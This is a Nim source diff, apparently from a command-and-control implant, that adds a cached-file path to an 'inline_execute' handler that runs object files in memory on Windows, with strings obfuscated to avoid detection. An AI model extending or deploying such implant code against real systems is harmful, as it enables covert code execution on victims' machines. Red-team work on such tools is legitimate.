@@ -1,5 +1,6 @@
 import json
 import ../utils/strenc
+import ../global_data
 
 when defined(windows):
   import base64, strutils
@@ -220,12 +221,25 @@ when defined(windows):
 
 const CHUNK_SIZE = 512000
 
+# Forward declaration
+proc processInlineExecuteChunk*(taskId: string, params: JsonNode, chunkData: string, totalChunks: int, currentChunk: int, fileData: var seq[byte]): JsonNode
+
 proc inlineExecute*(taskId: string, params: JsonNode): JsonNode =
   when not defined(windows):
     return %*{obf("task_id"): taskId, obf("completed"): true, obf("status"): "error", obf("user_output"): obf("inline_execute is only supported on Windows")}
   else:
     try:
       let args = to(params, InlineExecuteArgs)
+      
+      # Check if using cached file
+      if params.hasKey(obf("cached")):
+        let cachedName = params[obf("cached")].getStr()
+        let cachedData = getCachedFile(cachedName)
+        if cachedData.len == 0:
+          return %*{obf("task_id"): taskId, obf("completed"): true, obf("status"): "error", obf("user_output"): obf("File not found in cache. Use register_file first: ") & cachedName}
+        var fileData: seq[byte] = @[]
+        return processInlineExecuteChunk(taskId, params, encode(cast[string](cachedData)), 1, 1, fileData)
+      
       return %*{obf("task_id"): taskId, obf("upload"): {obf("file_id"): args.uuid, obf("chunk_num"): 1, obf("chunk_size"): CHUNK_SIZE, obf("full_path"): ""}}
     except Exception as e:
       return %*{obf("task_id"): taskId, obf("completed"): true, obf("status"): "error", obf("user_output"): obf("Failed to parse parameters: ") & e.msg}
